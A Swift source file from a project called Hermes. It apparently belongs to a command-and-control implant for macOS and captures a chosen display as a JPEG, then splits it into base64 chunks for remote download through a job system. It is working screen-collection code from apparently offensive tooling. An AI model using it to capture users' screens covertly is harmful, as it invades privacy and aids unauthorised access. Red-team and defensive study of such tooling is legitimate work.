//
//  screenshot.swift
//  Hermes
//
//  Created by Justin Bui on 7/9/21.
//

import Foundation
import Cocoa

func getTotalDisplays(job: Job) {
    var displayCount: UInt32 = 0;
    var result = CGGetActiveDisplayList(0, nil, &displayCount)
    if (result != CGError.success) {
        job.result = "Error: \(result)"
        job.completed = true
        job.success = false
        job.status = "error"
        return
    }
    let allocated = Int(displayCount)
    let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
    result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
    
    if (result != CGError.success) {
        job.result = "Error: \(result)"
        job.completed = true
        job.success = false
        job.status = "error"
        return
    }
    
    job.screenshotTotalDisplays = Int(displayCount)
}

func downloadScreenshotChunk(job: Job) {
    // Get screenshot data
    var displayCount: UInt32 = 0;
    var result = CGGetActiveDisplayList(0, nil, &displayCount)
    if (result != CGError.success) {
        job.result = "Error: \(result)"
        job.completed = true
        job.success = false
        job.status = "error"
        return
    }
    let allocated = Int(displayCount)
    let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
    result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
    if (result != CGError.success) {
        job.result = "Error: \(result)"
        job.completed = true
        job.success = false
        job.status = "error"
         return
     }
    
    let screenShot:CGImage = CGDisplayCreateImage(activeDisplays[job.screenshotDisplayNumber])!
    let bitmapRep = NSBitmapImageRep(cgImage: screenShot)
    let jpegData = bitmapRep.representation(using: NSBitmapImageRep.FileType.jpeg, properties: [:])!
    job.downloadFileSize = jpegData.count
    
    // This will start at 0, then go to 512000, and so on
    let offset = UInt64((job.downloadChunkNumber - 1) * 512000)

    // Read as much data as possible 512kb until the last chunk
    if job.downloadChunkNumber < job.downloadTotalChunks {
        // Read data and convert to b64
        let data = jpegData[offset ..< (offset + 512000)]
        let b64Data = toBase64(data: data)
        
        job.downloadChunkData = b64Data
    }
    // Last chunk read only the remaining data
    else if job.downloadChunkNumber == job.downloadTotalChunks {
        // Read remainder data and convert to b64
        let data = jpegData[Data.Index(offset) ..< job.downloadFileSize]
        let b64Data = toBase64(data: data)
        
        job.downloadChunkData = b64Data
    }
}
